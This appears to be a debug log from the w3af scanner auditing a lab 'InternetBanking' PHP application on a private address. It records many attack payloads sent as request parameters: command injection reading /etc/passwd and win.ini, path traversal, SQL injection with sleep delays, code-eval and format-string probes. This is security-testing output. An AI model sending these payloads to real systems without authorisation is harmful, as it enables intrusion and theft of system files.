[Fr 20 Nov 2015 21:33:27 CET - information] Enabling redos's dependency server_header
[Fr 20 Nov 2015 21:33:27 CET - information] Enabling dav's dependency allowed_methods
[Fr 20 Nov 2015 21:33:29 CET - information] Enabling frontpage's dependency frontpage_version
[Fr 20 Nov 2015 21:33:34 CET - debug] Called w3afCore.start()
[Fr 20 Nov 2015 21:33:34 CET - debug] Enabling _dns_cache()
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ] plugins
[ Fr 20 Nov 2015 21:33:34 CET - Enabled plugins ]     audit file_upload, eval, un_ssl, os_commanding, lfi, sqli, preg_replace, mx_injection, generic, format_string, websocket_hijacking, shell_shock, memcachei, ldapi, buffer_overflow, redos, global_redirect, xpath, cors_origin, htaccess_methods, dav, ssi, csrf, xss, ssl_certificate, xst, blind_sqli, phishing_vector, response_splitting, rfd, rfi, frontpage
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=w3af.org/rfi.html returned HTTP code "200" (id=1201,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - error] audit.rfi plugin needs to be correctly configured to use. Please set valid values for local address (eg. 10.5.2.5) and port (eg. 44449), or use the official w3af site as the target server for remote inclusions. The configuration error is: "Failed to bind to address 192.168.2.101:44449, error: [Errno 98] Address already in use"
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1202,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=ping -c 4 localhost returned HTTP code "200" (id=1203,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709193439184) 6.28234273195 > 0.0794439315796 > 2.96862858534
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709193439184) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: unix, Separator: "", Command: "ping -c %s localhost")>, response wait time was: 0.0794439315796 seconds.
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=key1 0 f 1
1
 returned HTTP code "200" (id=1204,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1205,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1206,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1207,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=key1 0 30 1
1
set injected 0 10 10
1234567890
 returned HTTP code "200" (id=1208,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1209,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1210,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php returned HTTP code "302" (id=1211,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=1" or pg_sleep(3) and "1"="1 returned HTTP code "200" (id=1212,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709195223632) 6.14106756449 > 0.0341031551361 > 2.98432582617
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709195223632) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1" or pg_sleep(%s) and "1"="1, delta:0, mult:1)>, response wait time was: 0.0341031551361 seconds.
[Fr 20 Nov 2015 21:48:59 CET - debug] URL "http://192.168.2.130/InternetBanking/client.php" is not vulnerable to RFD because of explicit filename in content-disposition header, response id 379
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 4 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 4)
[Fr 20 Nov 2015 21:48:59 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1213,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php returned HTTP code "302" (id=1214,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 10 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 10)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1215,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 19 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 19)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=/usr/sbin/ping -s localhost 4 returned HTTP code "200" (id=1216,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709193438416) 6.12465977669 > 0.0561048984528 > 2.9861489137
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709193438416) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: unix, Separator: "", Command: "/usr/sbin/ping -s localhost %s")>, response wait time was: 0.0561048984528 seconds.
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=echo str_repeat('gvdji',5); returned HTTP code "200" (id=1217,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] Updating socket timeout for 192.168.2.130 from 0.927257144451 to 1.05638376474 seconds
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=print 'gvdji'x5 returned HTTP code "200" (id=1218,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=print 'gvdji'*5 returned HTTP code "200" (id=1219,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=Response.Write(new String("gvdji",5)) returned HTTP code "200" (id=1220,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=/bin/cat /etc/passwd returned HTTP code "200" (id=1221,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=type %SYSTEMROOT%\win.ini returned HTTP code "200" (id=1222,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=&&/bin/cat /etc/passwd returned HTTP code "200" (id=1223,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=&&type %SYSTEMROOT%\win.ini returned HTTP code "200" (id=1224,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=|/bin/cat /etc/passwd returned HTTP code "200" (id=1225,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=|type %SYSTEMROOT%\win.ini returned HTTP code "200" (id=1226,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=;/bin/cat /etc/passwd returned HTTP code "200" (id=1227,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=;type %SYSTEMROOT%\win.ini returned HTTP code "200" (id=1228,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=`/bin/cat /etc/passwd` returned HTTP code "200" (id=1229,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=run type %SYSTEMROOT%\win.ini returned HTTP code "200" (id=1230,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=client.php returned HTTP code "200" (id=1231,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1232,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=../../../../../../../../../../../../../../../etc/passwd returned HTTP code "200" (id=1233,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=../../../../../../../../../../../../../../../etc/passwd\0 returned HTTP code "200" (id=1234,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=../../../../../../../../../../../../../../../etc/passwd\0.html returned HTTP code "200" (id=1235,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=/etc/passwd returned HTTP code "200" (id=1236,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=/etc/passwd\0 returned HTTP code "200" (id=1237,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=/etc/passwd\0.html returned HTTP code "200" (id=1238,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=/etc/passwd%00.php returned HTTP code "200" (id=1239,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1240,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=../../../../../../../../../../../../../../../etc/passwd%00.php returned HTTP code "200" (id=1241,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=../../../../../../../../../../../../../../../boot.ini\0 returned HTTP code "200" (id=1242,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=../../../../../../../../../../../../../../../boot.ini\0.html returned HTTP code "200" (id=1243,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=;/usr/sbin/ping -s localhost 4" returned HTTP code "200" (id=1244,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709199052496) 6.30862802267 > 0.12114405632 > 2.96570799748
[Fr 20 Nov 2015 21:48:59 CET - debug] (Test id: 140709199052496) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/login.php - parameter "password" for 3 seconds using <Command (OS: unix, Separator: ";", Command: ";/usr/sbin/ping -s localhost %s")>, response wait time was: 0.12114405632 seconds.
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=C:\boot.ini returned HTTP code "200" (id=1245,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=C:\boot.ini\0 returned HTTP code "200" (id=1246,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=C:\boot.ini\0.html returned HTTP code "200" (id=1247,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%SYSTEMROOT%\win.ini returned HTTP code "200" (id=1248,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%SYSTEMROOT%\win.ini\0 returned HTTP code "200" (id=1249,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%SYSTEMROOT%\win.ini\0.html returned HTTP code "200" (id=1250,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=C:\boot.ini%00.php returned HTTP code "200" (id=1251,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%SYSTEMROOT%\win.ini%00.php returned HTTP code "200" (id=1252,from_cache=1,grep=0)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 3 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 3)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1253,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=a'b"c'd" returned HTTP code "200" (id=1254,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:48:59 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=" returned HTTP code "200" (id=1255,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=iDontExist returned HTTP code "200" (id=1256,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action= returned HTTP code "200" (id=1257,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1258,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1259,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1260,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=82" OR "82"="82 returned HTTP code "200" (id=1261,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1262,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=01gvg40D returned HTTP code "200" (id=1263,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=&&ping -n 4 localhost returned HTTP code "200" (id=1264,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193439184) 6.3516869545 > 0.0549931526184 > 2.96092367172
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193439184) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: windows, Separator: "&&", Command: "&&ping -n %s localhost")>, response wait time was: 0.0549931526184 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=82" AND "82"="83 returned HTTP code "200" (id=1265,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1266,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1267,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=82' OR '82'='82 returned HTTP code "200" (id=1268,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1269,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=sleep(3); returned HTTP code "200" (id=1270,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600305104) 6.1555942297 > 0.0359220504761 > 2.98271175226
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600305104) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:sleep(%s);, delta:0, mult:1)>, response wait time was: 0.0359220504761 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=82' AND '82'='83 returned HTTP code "200" (id=1271,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1272,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1273,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1274,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=82 OR 82=82  returned HTTP code "200" (id=1275,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1276,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=`ping -n 4 localhost`" returned HTTP code "200" (id=1277,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709195275536) 6.27217555046 > 0.0416209697723 > 2.96975827217
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709195275536) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/login.php - parameter "password" for 3 seconds using <Command (OS: windows, Separator: "`", Command: "`ping -n %s localhost`")>, response wait time was: 0.0416209697723 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1278,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=82 AND 82=83  returned HTTP code "200" (id=1279,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1280,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1281,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=&&ping -c 4 localhost returned HTTP code "200" (id=1282,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193438416) 6.11829525232 > 0.0535280704498 > 2.98685608308
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193438416) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: unix, Separator: "&&", Command: "&&ping -c %s localhost")>, response wait time was: 0.0535280704498 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=__import__('time').sleep(3) returned HTTP code "200" (id=1283,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600301136) 6.07551455498 > 0.0478980541229 > 2.99160949389
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600301136) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:__import__('time').sleep(%s), delta:0, mult:1)>, response wait time was: 0.0478980541229 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1284,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] Updating socket timeout for 192.168.2.130 from 1.05638376474 to 0.914604127407 seconds
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1285,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1286,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1287,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1288,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=d'kc"z'gj'"**5*(((;-*`) returned HTTP code "200" (id=1289,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1290,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] Created 4 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 4)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1291,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action= returned HTTP code "200" (id=1292,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] Created 1 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=1;waitfor delay '0:0:3'-- returned HTTP code "200" (id=1293,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1294,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709599509840) 6.07227373123 > 0.0911259651184 > 2.99196958542
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709599509840) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <ExactDelay (fmt:1;waitfor delay '0:0:%s'--, delta:0, mult:1)>, response wait time was: 0.0911259651184 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%n returned HTTP code "200" (id=1295,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%n%n%n%n%n%n%n%n%n%n returned HTTP code "200" (id=1296,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n returned HTTP code "200" (id=1297,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n returned HTTP code "200" (id=1298,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=^(#$!@#$)(()))****** returned HTTP code "200" (id=1299,from_cache=1,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=historypdf returned HTTP code "200" (id=1300,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] Created 5 mutants for "Method: GET | http://192.168.2.130/InternetBanking/client.php | Query string: (action)" (query string: 5)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1301,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=online returned HTTP code "200" (id=1302,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] POST http://192.168.2.130/InternetBanking/login.php with data: "username=Test01!&password=Test01!" returned HTTP code "302" (id=1303,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=&&/usr/sbin/ping -s localhost 4 returned HTTP code "200" (id=1304,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193439184) 6.20218795538 > 0.0518698692322 > 2.97753467162
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709193439184) Failed to control HTTP response delay for URL http://192.168.2.130/InternetBanking/client.php - parameter "action" for 3 seconds using <Command (OS: unix, Separator: "&&", Command: "&&/usr/sbin/ping -s localhost %s")>, response wait time was: 0.0518698692322 seconds.
[Fr 20 Nov 2015 21:49:00 CET - debug] GET http://192.168.2.130/InternetBanking/client.php?action=Thread.sleep(3000); returned HTTP code "200" (id=1305,from_cache=0,grep=1)
[Fr 20 Nov 2015 21:49:00 CET - debug] (Test id: 140709600305104) 6.19416904449 > 0.050656080246 > 2.97842566172
